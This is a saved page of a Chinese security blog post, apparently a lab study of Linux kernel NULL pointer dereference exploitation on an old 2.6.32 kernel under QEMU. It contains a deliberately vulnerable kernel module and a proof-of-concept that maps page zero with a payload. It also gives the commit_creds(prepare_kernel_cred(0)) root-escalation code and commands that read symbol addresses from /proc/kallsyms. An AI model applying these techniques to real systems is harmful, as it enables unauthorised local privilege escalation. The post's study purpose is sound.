@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<title>linux-kernel expoit  study (3)---NULL dereference | Swings'Blog|浮生若梦|CTFer|Binary|Python</title>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+<meta content="NULL dereference 内核漏洞" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="linux-kernel expoit  study (3)---NULL dereference" property="og:title"/>
+<meta content="http://bestwing.me/2017/04/08/write-kernel-exploits-1/index.html" property="og:url"/>
+<meta content="Swings'Blog|浮生若梦|CTFer|Binary|Python" property="og:site_name"/>
+<meta content="NULL dereference 内核漏洞" property="og:description"/>
+<meta content="http://i2.muimg.com/567571/c5e276ea405d452f.jpg" property="og:image"/>
+<meta content="http://i1.piimg.com/567571/697a6d600f0a6455.jpg" property="og:image"/>
+<meta content="http://i4.buimg.com/567571/bf793c7cb4edb01b.png" property="og:image"/>
+<meta content="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png" property="og:image"/>
+<meta content="http://i1.piimg.com/567571/d4b0b3e61d7fc12c.png" property="og:image"/>
+<meta content="http://i2.muimg.com/567571/187cbbe3fbce5987.png" property="og:image"/>
+<meta content="http://i1.piimg.com/567571/984a5526d03f5df1.png" property="og:image"/>
+<meta content="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png" property="og:image"/>
+<meta content="2017-04-09T15:42:24.159Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="linux-kernel expoit  study (3)---NULL dereference" name="twitter:title"/>
+<meta content="NULL dereference 内核漏洞" name="twitter:description"/>
+<meta content="http://i2.muimg.com/567571/c5e276ea405d452f.jpg" name="twitter:image"/>
+<link href="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/atom.xml" rel="alternative" title="Swings'Blog|浮生若梦|CTFer|Binary|Python" type="application/atom+xml"/>
+<link href="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/98028288-file_1488275496708_10f1d.jpg" rel="icon"/>
+<link href="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/animate.min.css" rel="stylesheet"/>
+<link href="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/style.css" rel="stylesheet"/>
+<link href="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/font-awesome.min.css" rel="stylesheet"/>
+<link href="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/jquery.fancybox.css" rel="stylesheet"/>
+<!-- 加载特效 -->
+<script src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/pace.js"></script>
+<link href="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/pace-theme-flash.css" rel="stylesheet">
+<script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</link></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/180526%20"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/">Swing|浮生若梦</a></h1>
+</hgroup>
+<p class="header-subtitle">努力是为了 站在万人中央 成为别人的光</p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="http://bestwing.me">博客首页</a></li>
+<li><a href="/archives/">文章归档</a></li>
+<li><a href="/about">留言打卡</a></li>
+<li><a href="/CTF-Study">学习导航</a></li>
+<li><a href="/PWNABLE">PWNABLE</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fl mail" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" target="_blank" title="mail">mail</a>
+<a class="fl github" href="https://github.com/WinMin" target="_blank" title="github">github</a>
+<a class="fl zhihu" href="https://www.zhihu.com/people/swing-57-29/activities" target="_blank" title="zhihu">zhihu</a>
+<a class="fl twitter" href="https://twitter.com/bestswngs" target="_blank" title="twitter">twitter</a>
+<a class="fl rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<a href="/tags/0CTF/" style="font-size: 10px;">0CTF</a> <a href="/tags/360春秋杯/" style="font-size: 10px;">360春秋杯</a> <a href="/tags/Bin/" style="font-size: 10px;">Bin</a> <a href="/tags/Book/" style="font-size: 10px;">Book</a> <a href="/tags/CCTF/" style="font-size: 10px;">CCTF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12px;">Crypto</a> <a href="/tags/DEFCON/" style="font-size: 10px;">DEFCON</a> <a href="/tags/ELF/" style="font-size: 10px;">ELF</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/Hexo/" style="font-size: 18px;">Hexo</a> <a href="/tags/John/" style="font-size: 10px;">John</a> <a href="/tags/Kcon/" style="font-size: 10px;">Kcon</a> <a href="/tags/Linux-kernel/" style="font-size: 16px;">Linux-kernel</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/NJCTF/" style="font-size: 10px;">NJCTF</a> <a href="/tags/NUCA/" style="font-size: 12px;">NUCA</a> <a href="/tags/PCTF/" style="font-size: 10px;">PCTF</a> <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Pwntools/" style="font-size: 10px;">Pwntools</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/Reverse/" style="font-size: 18px;">Reverse</a> <a href="/tags/SSTF/" style="font-size: 10px;">SSTF</a> <a href="/tags/SUCTF/" style="font-size: 10px;">SUCTF</a> <a href="/tags/Think/" style="font-size: 14px;">Think</a> <a href="/tags/Tools/" style="font-size: 10px;">Tools</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/Web/" style="font-size: 12px;">Web</a> <a href="/tags/WiFi/" style="font-size: 10px;">WiFi</a> <a href="/tags/Writeup/" style="font-size: 14px;">Writeup</a> <a href="/tags/angry/" style="font-size: 10px;">angry</a> <a href="/tags/exploit/" style="font-size: 10px;">exploit</a> <a href="/tags/i春秋-百度杯/" style="font-size: 14px;">i春秋-百度杯</a> <a href="/tags/i春秋-腾讯30强/" style="font-size: 12px;">i春秋-腾讯30强</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/wooyun/" style="font-size: 10px;">wooyun</a> <a href="/tags/上海省赛/" style="font-size: 10px;">上海省赛</a> <a href="/tags/华山杯CTF/" style="font-size: 10px;">华山杯CTF</a> <a href="/tags/科学上网/" style="font-size: 10px;">科学上网</a> <a href="/tags/陕西省赛/" style="font-size: 10px;">陕西省赛</a>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="http://ring3.xyz/" target="_blank">Yllen</a>
+<a class="main-nav-link switch-friends-link" href="http://mxny.org/" target="_blank">麦香浓郁</a>
+<a class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/" target="_blank">K0sh1</a>
+<a class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/" target="_blank">信鑫</a>
+<a class="main-nav-link switch-friends-link" href="http://bystudent.com/" target="_blank">ByStundet表哥</a>
+<a class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/" target="_blank">汪神_Jarvis</a>
+<a class="main-nav-link switch-friends-link" href="http://sh3ll.me/" target="_blank">Chu</a>
+<a class="main-nav-link switch-friends-link" href="https://www.hackfun.org/" target="_blank">4ido10n</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy" target="_blank">L3m0n</a>
+<a class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/" target="_blank">muhe</a>
+<a class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/" target="_blank">_画船听雨</a>
+<a class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html" target="_blank">Virink</a>
+<a class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/" target="_blank">国光</a>
+<a class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/" target="_blank">老锥</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cizel.cn/" target="_blank">C1zel</a>
+<a class="main-nav-link switch-friends-link" href="http://1phan.cc" target="_blank">1phan</a>
+<a class="main-nav-link switch-friends-link" href="https://www.liuil.top/" target="_blank">liuil</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/" target="_blank">Ox9A82</a>
+<a class="main-nav-link switch-friends-link" href="http://burnegg.com/" target="_blank">burnegg</a>
+<a class="main-nav-link switch-friends-link" href="https://jwrsec.cn/" target="_blank">jwr-sec</a>
+<a class="main-nav-link switch-friends-link" href="http://sudalover.cn/" target="_blank">苏打</a>
+<a class="main-nav-link switch-friends-link" href="http://blog.binklac.com" target="_blank">VeroFess</a>
+<a class="main-nav-link switch-friends-link" href="http://www.bendawang.site/" target="_blank">bendawang</a>
+<a class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/" target="_blank">hook</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">我想一年后再来写这个 2016年9月4日</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Swing|浮生若梦</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/180526%20"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="回到主页">Swing|浮生若梦</a></h1>
+</hgroup>
+<p class="header-subtitle">努力是为了 站在万人中央 成为别人的光</p>
+<nav class="header-menu">
+<ul>
+<li><a href="http://bestwing.me">博客首页</a></li>
+<li><a href="/archives/">文章归档</a></li>
+<li><a href="/about">留言打卡</a></li>
+<li><a href="/CTF-Study">学习导航</a></li>
+<li><a href="/PWNABLE">PWNABLE</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<div class="social">
+<a class="mail" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" target="_blank" title="mail">mail</a>
+<a class="github" href="https://github.com/WinMin" target="_blank" title="github">github</a>
+<a class="zhihu" href="https://www.zhihu.com/people/swing-57-29/activities" target="_blank" title="zhihu">zhihu</a>
+<a class="twitter" href="https://twitter.com/bestswngs" target="_blank" title="twitter">twitter</a>
+<a class="rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</div>
+</nav>
+</header>
+</div>
+</nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-write-kernel-exploits-1" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2017/04/08/write-kernel-exploits-1/">
+<time datetime="2017-04-07T16:00:00.000Z" itemprop="datePublished">2017-04-08</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      linux-kernel expoit  study (3)---NULL dereference
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-category tagcloud">
+<a class="article-category-link" href="/categories/Binary/">Binary</a>
+</div>
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux-kernel/">Linux-kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<h1 id="write-linux-kernel-exploit-1"><a class="headerlink" href="#write-linux-kernel-exploit-1" title="write linux kernel exploit 1"></a>write linux kernel exploit 1</h1><h2 id="前言-重新配置一下-busybox"><a class="headerlink" href="#前言-重新配置一下-busybox" title="前言  -重新配置一下 busybox"></a>前言  -重新配置一下 busybox</h2><p>之前的busybox 废了，发现出现了意料之外，情理之中的问题。还是太浮躁了，没仔细看参考链接。<br/>重新配置一下 busybox</p>
+<h3 id="step-1"><a class="headerlink" href="#step-1" title="step 1"></a>step 1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> _install</div></pre></td></tr></table></figure>
+<h3 id="step-2-创建对应的目录"><a class="headerlink" href="#step-2-创建对应的目录" title="step 2 创建对应的目录"></a>step 2 创建对应的目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ mkdir proc sys dev etc etc/init.d</div><div class="line">$ <span class="built_in">cd</span> etc/init.d</div><div class="line">$ vim rcS</div><div class="line">$ cat rcS</div><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">mount -t proc none /proc</div><div class="line">mount -t sys none /sys</div><div class="line">/bin/mount -n -t sysfs none /sys</div><div class="line">/bin/mount -t ramfs none /dev</div><div class="line">/sbin/mdev <span class="_">-s</span></div><div class="line">$ chmod +x rcS</div><div class="line">$ find . | cpio -o --format=newc &gt; rootfs.img</div><div class="line">$ gzip -c rootfs.img &gt; rootfs.img.gz</div><div class="line">$ cp rootfs.img.gz ../../linux-2.6.32.1</div></pre></td></tr></table></figure>
+<h3 id="解决can’t-not-open-dev-tty2"><a class="headerlink" href="#解决can’t-not-open-dev-tty2" title="解决can’t not open /dev/tty2"></a>解决can’t not open /dev/tty2</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ cd <span class="emphasis">_install</span></div><div class="line">$ ln -sf null tty2</div><div class="line">$ ln -sf null tty3</div><div class="line">$ ln -sf null tty4</div><div class="line"></div><div class="line">$ vim etc/init.d/fstab</div><div class="line">proc  /proc      proc    defaults     0      0</div><div class="line">proc  /proc      proc    defaults     0      0</div><div class="line">$  chmod 644 fstab</div><div class="line"></div><div class="line">$ vim etc/init.d/inittab</div><div class="line"><span class="meta">::sysinit:/etc/init.d/rcS</span></div><div class="line"><span class="meta">::askfirst:/bin/sh</span></div><div class="line">$ chmod 644 inittab</div></pre></td></tr></table></figure>
+<h3 id="qume-启用busybox"><a class="headerlink" href="#qume-启用busybox" title="qume 启用busybox"></a>qume 启用busybox</h3><p><code>cd /tmp</code><br/>创建一个ext2文件系统镜像用于把joker_test_syscall_lib和对应的busybox打包，其大小应该能容纳整个busybox/_install<br/><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="selector-tag">dd</span> <span class="keyword">if</span>=/dev/zero of=my<span class="selector-class">.img</span> bs=<span class="number">30</span>M count=<span class="number">2</span></div><div class="line">$ mkfs<span class="selector-class">.ext2</span> -N <span class="number">512</span> my.img</div></pre></td></tr></table></figure></p>
+<p>挂在镜像，并把busybx/_install下的内容拷贝过去<br/><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>sudo mount -t ext2 my.img /mnt</div><div class="line"><span class="variable">$ </span>sudo cp -fr _install/* <span class="regexp">/mnt</span></div></pre></td></tr></table></figure></p>
+<p>卸载镜像<br/><code>$ sudo umount /mnt</code></p>
+<p><code>qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append "root=/dev/sda"</code></p>
+<h2 id="NULL-dereference"><a class="headerlink" href="#NULL-dereference" title="NULL dereference"></a>NULL dereference</h2><blockquote>
+<p>古老的Linux NULL pointer dereference exploit,映射0地址分配shellcode运行</p>
+</blockquote>
+<h3 id="一个简单的demo"><a class="headerlink" href="#一个简单的demo" title="一个简单的demo"></a>一个简单的demo</h3><blockquote>
+<p>漏洞很明显，my_funptr指针是空，在调用虚拟文件系统write_proc时候出现null dereference</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">$ vim null_dereference.c</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></div><div class="line"><span class="keyword">void</span> (*my_funptr)(<span class="keyword">void</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug1_write</span><span class="params">(<span class="keyword">struct</span> file *file,<span class="keyword">const</span> <span class="keyword">char</span> *buf,<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></div><div class="line">{</div><div class="line">	my_funptr();</div><div class="line">	<span class="keyword">return</span> len;</div><div class="line">}</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> <span class="number">__</span><span class="function">init <span class="title">null_dereference_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">	printk(KERN_ALERT <span class="string">"null_dereference driver init!\n"</span>);</div><div class="line">	create_proc_entry(<span class="string">"bug1"</span>,<span class="number">0666</span>,<span class="number">0</span>)-&gt;write_proc = bug1_write;</div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="number">__</span><span class="function"><span class="built_in">exit</span> <span class="title">null_dereference_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">	printk(KERN_ALERT <span class="string">"null_dereference driver exit\n"</span>);</div><div class="line">}</div><div class="line"></div><div class="line">module_init(null_dereference_init);</div><div class="line">module_exit(null_dereference_exit);</div></pre></td></tr></table></figure>
+<h3 id="简单的测试"><a class="headerlink" href="#简单的测试" title="简单的测试"></a>简单的测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">qemu启动内核，加载相关的busybox</div><div class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">"root=/dev/sda"</span> </div><div class="line"></div><div class="line">加载模块</div><div class="line">$ insmod null_dereference.ko</div></pre></td></tr></table></figure>
+<p><img alt="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/c5e276ea405d452f.jpg"/></p>
+<h2 id="在qemu中运行并测试"><a class="headerlink" href="#在qemu中运行并测试" title="在qemu中运行并测试"></a>在qemu中运行并测试</h2><blockquote>
+<p>在本机编译相应的ko、poc和exp，并把ko、poc和exp添加到busybox镜像中，然后gdb与qemu结合调试，其中poc和exp需要静态编译。<a href="add-a-system-call">方法见–在qemu中测试</a><br/><strong>ko文件的Makefile, KERNELDR目录设置为linux内核源码的根目录即可</strong><br/><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">obj-m := null_dereference.o  </div><div class="line">KERNELDR := ~/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>  </div><div class="line">PWD := $(shell pwd)  </div><div class="line">modules:  </div><div class="line">	$(MAKE) -C $(KERNELDR) M=$(PWD) modules  </div><div class="line">moduels_install:  </div><div class="line">	$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </div><div class="line">clean:  </div><div class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="poc测试"><a class="headerlink" href="#poc测试" title="poc测试"></a>poc测试</h3><blockquote>
+<p>poc</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ vim null_dereference_exp.c</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> payload[] = <span class="string">"\xe9\xea\xbe\xad\x0b"</span>;<span class="comment">//jmp 0xbadbeef</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">{</div><div class="line">	mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">	<span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</div><div class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/proc/bug1"</span>, O_WRONLY);</div><div class="line">	write(fd, <span class="string">"0x9k"</span>, <span class="number">4</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"> }</div><div class="line">$ gcc -<span class="keyword">static</span> -o null_dereference_exp null_dereference_exp.c</div></pre></td></tr></table></figure>
+<blockquote>
+<p>qemu调试在0地址处下断点</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">以调试模式启动qemu</div><div class="line">$ qemu-system-i386 -S -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">"root=/dev/sda"</span></div><div class="line"></div><div class="line">在qemu中按住Ctrl＋Alt＋2</div><div class="line">$ gdbserver tcp::1234</div></pre></td></tr></table></figure>
+<p><img alt="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/697a6d600f0a6455.jpg"/><br/>linux 内核目录下<br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">在主机中启动gdb,并链接qemu并设置断点</div><div class="line">$ gdb vmlinux</div><div class="line">gdb-peda$ target remote localhost:1234</div><div class="line">gdb-peda$ b *0x0</div><div class="line">gdb-peda$ c</div><div class="line"></div><div class="line">在qemu中按住Ctrl+Alt+1切换到运行状态</div></pre></td></tr></table></figure></p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/bf793c7cb4edb01b.png"/></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">运行poc</div><div class="line">$ ./poc</div></pre></td></tr></table></figure>
+<p>然后进入usr目录，挂载驱动后运行poc程序。<br/><img alt="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/d9c6c7f76d44cd49.png"/><br/><img alt="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/d4b0b3e61d7fc12c.png"/></p>
+<h2 id="exp"><a class="headerlink" href="#exp" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">给当前进程赋予root权限</div><div class="line">commit_creds(prepare_kernel_cred(0));</div></pre></td></tr></table></figure>
+<h3 id="实现方法-1-通用获取"><a class="headerlink" href="#实现方法-1-通用获取" title="实现方法 1 通用获取"></a>实现方法 1 通用获取</h3><p>K0 师傅告诉我了一个姿势，可以通用提权<br/><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="number">__</span>attribute__((regparm(<span class="number">3</span>))) (* <span class="number">_</span>commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="number">__</span>attribute__((regparm(<span class="number">3</span>))) (* <span class="number">_</span>prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</div><div class="line"> </div><div class="line"><span class="number">_</span>commit_creds commit_creds = (<span class="number">_</span>commit_creds)COMMIT_CREDS;</div><div class="line"><span class="number">_</span>prepare_kernel_cred prepare_kernel_cred = (<span class="number">_</span>prepare_kernel_cred)PREPARE_KERNEL_CRED;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_payload</span><span class="params">(<span class="keyword">void</span>)</span> </span>{</div><div class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</div><div class="line">}</div></pre></td></tr></table></figure></p>
+<p>在内存里找到commit creds和prepare kernel cred 这两个函数地址然后就直接写在一个函数里到漏洞触发的时候，直接引用这个函数地址就可以提权了</p>
+<p>但是，我们这里简单的使用方法 2 即可c</p>
+<h3 id="实现方法-2-简单的取得commit-creds、prepare-kernel-cred地址"><a class="headerlink" href="#实现方法-2-简单的取得commit-creds、prepare-kernel-cred地址" title="实现方法 2  简单的取得commit_creds、prepare_kernel_cred地址"></a>实现方法 2  简单的取得commit_creds、prepare_kernel_cred地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ grep commit_creds /proc/kallsyms</div><div class="line">$ grep prepare_kernel_cred /proc/kallsyms</div></pre></td></tr></table></figure>
+<p><img alt="" src="./linux-kernel expoit  study (3)---NULL dereference  Swings'Blog浮生若梦CTFerBinaryPython/187cbbe3fbce5987.png"/></p>
